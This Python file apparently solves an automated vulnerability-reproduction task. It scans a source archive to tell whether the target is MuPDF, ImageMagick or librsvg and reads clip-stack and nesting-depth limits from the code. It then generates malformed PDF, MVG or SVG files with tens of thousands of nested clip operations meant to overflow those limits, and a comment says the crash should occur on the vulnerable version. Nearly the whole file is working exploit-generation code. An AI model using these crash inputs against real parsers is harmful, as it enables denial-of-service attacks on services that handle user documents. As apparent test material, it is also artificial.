import os
import re
import tarfile
from typing import Iterable, List, Optional, Tuple


CODE_EXTS = {
    ".c", ".cc", ".cpp", ".cxx", ".h", ".hpp", ".hh", ".inc", ".inl", ".m", ".mm",
    ".rs", ".go", ".java", ".kt", ".swift", ".py"
}

INTERESTING_NAME_SUBS = (
    "clip", "draw", "stack", "layer", "device", "render", "pdf", "svg", "mvg",
    "fuzz", "fuzzer", "canvas", "graphics", "vector"
)

KEYWORDS = (
    "clip mark", "clip_mark", "clipmark", "clip stack", "layer/clip", "layer clip",
    "nesting depth", "nesting_depth", "push clip", "push clip-path", "push clip-path",
    "LLVMFuzzerTestOneInput", "mupdf", "fitz", "fz_context", "MagickWandGenesis", "MagickCore"
)


def _is_code_file(name: str) -> bool:
    _, ext = os.path.splitext(name)
    return ext.lower() in CODE_EXTS


def _interesting_by_name(name: str) -> bool:
    ln = name.lower()
    return any(s in ln for s in INTERESTING_NAME_SUBS)


def _decode_best_effort(b: bytes) -> str:
    try:
        return b.decode("utf-8", errors="ignore")
    except Exception:
        try:
            return b.decode("latin-1", errors="ignore")
        except Exception:
            return ""


def _weighted_limits_from_text(text: str) -> List[Tuple[int, int]]:
    out: List[Tuple[int, int]] = []
    # #define NAME 1234
    for m in re.finditer(r'^\s*#\s*define\s+([A-Za-z_][A-Za-z0-9_]*)\s+(\d+)\b', text, flags=re.M):
        name = m.group(1)
        val = int(m.group(2))
        up = name.upper()
        if val <= 0 or val > 5_000_000:
            continue
        weight = 0
        if "NEST" in up and "DEPTH" in up:
            weight += 8
        if "CLIP" in up and "DEPTH" in up:
            weight += 8
        if "CLIP" in up:
            weight += 4
        if "STACK" in up:
            weight += 4
        if "LAYER" in up:
            weight += 2
        if "DEPTH" in up:
            weight += 3
        if "SIZE" in up:
            weight += 2
        if "MAX" in up:
            weight += 1
        if weight > 0:
            out.append((weight, val))

    # const int NAME = 1234; / static const size_t NAME = 1234;
    for m in re.finditer(
        r'\b(?:static\s+)?(?:const\s+)?(?:unsigned\s+)?(?:int|size_t|uint32_t|uint16_t|long)\s+([A-Za-z_][A-Za-z0-9_]*)\s*=\s*(\d+)\b',
        text
    ):
        name = m.group(1)
        val = int(m.group(2))
        up = name.upper()
        if val <= 0 or val > 5_000_000:
            continue
        weight = 0
        if "NEST" in up and "DEPTH" in up:
            weight += 7
        if "CLIP" in up and "DEPTH" in up:
            weight += 7
        if "CLIP" in up:
            weight += 3
        if "STACK" in up:
            weight += 3
        if "DEPTH" in up:
            weight += 2
        if "LAYER" in up:
            weight += 1
        if weight > 0:
            out.append((weight, val))

    # enum { NAME = 1234 }
    for m in re.finditer(r'\benum\s*\{([^}]+)\}', text, flags=re.S):
        body = m.group(1)
        for mm in re.finditer(r'([A-Za-z_][A-Za-z0-9_]*)\s*=\s*(\d+)\b', body):
            name = mm.group(1)
            val = int(mm.group(2))
            up = name.upper()
            if val <= 0 or val > 5_000_000:
                continue
            weight = 0
            if "NEST" in up and "DEPTH" in up:
                weight += 6
            if "CLIP" in up and "DEPTH" in up:
                weight += 6
            if "STACK" in up:
                weight += 3
            if "CLIP" in up:
                weight += 3
            if "DEPTH" in up:
                weight += 2
            if "SIZE" in up:
                weight += 1
            if weight > 0:
                out.append((weight, val))

    return out


def _detect_16bit_nesting(text: str) -> bool:
    if re.search(r'\b(?:u?int16_t|unsigned\s+short)\s+[A-Za-z0-9_]*nest[A-Za-z0-9_]*depth\b', text):
        return True
    if re.search(r'\b(?:u?int16_t|unsigned\s+short)\s+[A-Za-z0-9_]*depth\b', text) and "nest" in text.lower():
        return True
    return False


def _scan_tar(src_path: str) -> Tuple[str, Optional[int], bool]:
    has_mupdf = False
    has_im = False
    has_rsvg = False

    weighted_limits: List[Tuple[int, int]] = []
    depth16 = False

    max_files_to_read = 2000
    read_count = 0

    try:
        with tarfile.open(src_path, "r:*") as tf:
            members = tf.getmembers()
            for mem in members:
                if not mem.isfile():
                    continue
                name = mem.name
                lname = name.lower()

                if "mupdf" in lname or "/fitz" in lname or lname.startswith("fitz/") or "fz_" in lname:
                    has_mupdf = True
                if "magickcore" in lname or "magickwand" in lname or "imagemagick" in lname:
                    has_im = True
                if "librsvg" in lname or "/rsvg" in lname or lname.startswith("rsvg/"):
                    has_rsvg = True

            for mem in members:
                if read_count >= max_files_to_read:
                    break
                if not mem.isfile():
                    continue
                name = mem.name
                if not _is_code_file(name):
                    continue
                if mem.size <= 0 or mem.size > 2_000_000:
                    continue
                if not _interesting_by_name(name):
                    continue

                f = tf.extractfile(mem)
                if f is None:
                    continue
                try:
                    b = f.read()
                except Exception:
                    continue
                read_count += 1
                text = _decode_best_effort(b)
                ltext = text.lower()

                if "mupdf" in ltext or "fz_context" in ltext or "fitz" in ltext:
                    has_mupdf = True
                if "magickwandgenesis" in ltext or "magickcore" in ltext:
                    has_im = True
                if "rsvg_handle_new_from_data" in ltext or "librsvg" in ltext:
                    has_rsvg = True

                if any(k in ltext for k in ("clip mark", "clip_mark", "clip stack", "nesting depth", "nesting_depth", "layer/clip", "layer clip")):
                    weighted_limits.extend(_weighted_limits_from_text(text))
                    if _detect_16bit_nesting(text):
                        depth16 = True
                elif any(k in ltext for k in ("push clip", "clip", "stack", "nesting", "depth")):
                    weighted_limits.extend(_weighted_limits_from_text(text))
                    if _detect_16bit_nesting(text):
                        depth16 = True

    except Exception:
        return ("unknown", None, False)

    project = "unknown"
    if has_mupdf:
        project = "mupdf"
    elif has_im:
        project = "imagemagick"
    elif has_rsvg:
        project = "librsvg"

    limit = None
    if weighted_limits:
        # Prefer higher weight, then smaller values (stack sizes tend to be small)
        weighted_limits.sort(key=lambda x: (-x[0], x[1]))
        best_weight = weighted_limits[0][0]
        best_vals = [v for w, v in weighted_limits if w == best_weight]
        # Pick a reasonable one: avoid tiny (<=8) and huge (>500k) if possible
        reasonable = [v for v in best_vals if 8 < v <= 500_000]
        limit = min(reasonable) if reasonable else best_vals[0]

    return (project, limit, depth16)


def _scan_dir(src_dir: str) -> Tuple[str, Optional[int], bool]:
    has_mupdf = False
    has_im = False
    has_rsvg = False

    weighted_limits: List[Tuple[int, int]] = []
    depth16 = False

    max_files_to_read = 2500
    read_count = 0

    for root, _, files in os.walk(src_dir):
        for fn in files:
            p = os.path.join(root, fn)
            rel = os.path.relpath(p, src_dir).replace("\\", "/")
            lname = rel.lower()

            if "mupdf" in lname or "/fitz" in lname or lname.startswith("fitz/") or "fz_" in lname:
                has_mupdf = True
            if "magickcore" in lname or "magickwand" in lname or "imagemagick" in lname:
                has_im = True
            if "librsvg" in lname or "/rsvg" in lname or lname.startswith("rsvg/"):
                has_rsvg = True

            if read_count >= max_files_to_read:
                continue
            if not _is_code_file(rel):
                continue
            if not _interesting_by_name(rel):
                continue
            try:
                st = os.stat(p)
                if st.st_size <= 0 or st.st_size > 2_000_000:
                    continue
                with open(p, "rb") as f:
                    b = f.read()
            except Exception:
                continue
            read_count += 1
            text = _decode_best_effort(b)
            ltext = text.lower()

            if "mupdf" in ltext or "fz_context" in ltext or "fitz" in ltext:
                has_mupdf = True
            if "magickwandgenesis" in ltext or "magickcore" in ltext:
                has_im = True
            if "rsvg_handle_new_from_data" in ltext or "librsvg" in ltext:
                has_rsvg = True

            if any(k in ltext for k in ("clip mark", "clip_mark", "clip stack", "nesting depth", "nesting_depth", "layer/clip", "layer clip")):
                weighted_limits.extend(_weighted_limits_from_text(text))
                if _detect_16bit_nesting(text):
                    depth16 = True
            elif any(k in ltext for k in ("push clip", "clip", "stack", "nesting", "depth")):
                weighted_limits.extend(_weighted_limits_from_text(text))
                if _detect_16bit_nesting(text):
                    depth16 = True

    project = "unknown"
    if has_mupdf:
        project = "mupdf"
    elif has_im:
        project = "imagemagick"
    elif has_rsvg:
        project = "librsvg"

    limit = None
    if weighted_limits:
        weighted_limits.sort(key=lambda x: (-x[0], x[1]))
        best_weight = weighted_limits[0][0]
        best_vals = [v for w, v in weighted_limits if w == best_weight]
        reasonable = [v for v in best_vals if 8 < v <= 500_000]
        limit = min(reasonable) if reasonable else best_vals[0]

    return (project, limit, depth16)


def _build_pdf_with_clip_repeats(n: int) -> bytes:
    op = b"0 0 1 1 re W n\n"
    stream = b"q\n" + (op * n) + b"Q\n"

    header = b"%PDF-1.4\n%\xE2\xE3\xCF\xD3\n"
    obj1 = b"1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n"
    obj2 = b"2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n"
    obj3 = b"3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 1 1] /Contents 4 0 R >>\nendobj\n"
    obj4 = (b"4 0 obj\n<< /Length " + str(len(stream)).encode("ascii") +
            b" >>\nstream\n" + stream + b"endstream\nendobj\n")

    parts = [header, obj1, obj2, obj3, obj4]
    offsets = [0]
    cur = 0
    for i, part in enumerate(parts):
        if i == 0:
            cur += len(part)
            continue
        offsets.append(cur)
        cur += len(part)

    xref_start = cur
    xref_lines = [b"xref\n", b"0 5\n", b"0000000000 65535 f \n"]
    for i in range(1, 5):
        xref_lines.append(("%010d 00000 n \n" % offsets[i]).encode("ascii"))
    xref = b"".join(xref_lines)

    trailer = (b"trailer\n<< /Size 5 /Root 1 0 R >>\nstartxref\n" +
               str(xref_start).encode("ascii") + b"\n%%EOF\n")
    return b"".join(parts) + xref + trailer


def _build_mvg_with_clip_pushes(n: int) -> bytes:
    # Intentionally deeply nested clip-path pushes.
    # Keep tokens simple to be recognized by MVG detectors.
    pre = "push graphic-context\nviewbox 0 0 1 1\n"
    line = "push clip-path c\n"
    # Note: we do not pop; crash should happen during pushing on vulnerable version.
    s = pre + (line * n) + "pop graphic-context\n"
    return s.encode("ascii", errors="ignore")


def _build_svg_with_nested_clip_groups(n: int) -> bytes:
    head = '<svg xmlns="http://www.w3.org/2000/svg" width="1" height="1">'
    defs = '<defs><clipPath id="c"><rect x="0" y="0" width="1" height="1"/></clipPath></defs>'
    open_g = '<g clip-path="url(#c)">'
    close_g = '</g>'
    tail = '</svg>'
    s = head + defs + (open_g * n) + (close_g * n) + tail
    return s.encode("utf-8", errors="ignore")


class Solution:
    def solve(self, src_path: str) -> bytes:
        if os.path.isdir(src_path):
            project, limit, depth16 = _scan_dir(src_path)
        else:
            project, limit, depth16 = _scan_tar(src_path)

        if project == "mupdf":
            if limit is not None and 16 <= limit <= 200_000:
                n = limit + 20
            else:
                n = 60000
            if depth16:
                n = max(n, 70000)
            n = min(max(n, 32), 200_000)
            return _build_pdf_with_clip_repeats(n)

        if project == "imagemagick":
            if limit is not None and 16 <= limit <= 200_000:
                n = limit + 20
            else:
                n = 50000
            if depth16:
                n = max(n, 70000)
            n = min(max(n, 64), 200_000)
            return _build_mvg_with_clip_pushes(n)

        if project == "librsvg":
            if limit is not None and 16 <= limit <= 200_000:
                n = limit + 20
            else:
                n = 50000
            if depth16:
                n = max(n, 70000)
            n = min(max(n, 64), 200_000)
            return _build_svg_with_nested_clip_groups(n)

        # Fallback: try PDF strategy; commonly accepted by multiple document parsers.
        n = 70000 if depth16 else 60000
        n = min(max(n, 64), 200_000)
        return _build_pdf_with_clip_repeats(n)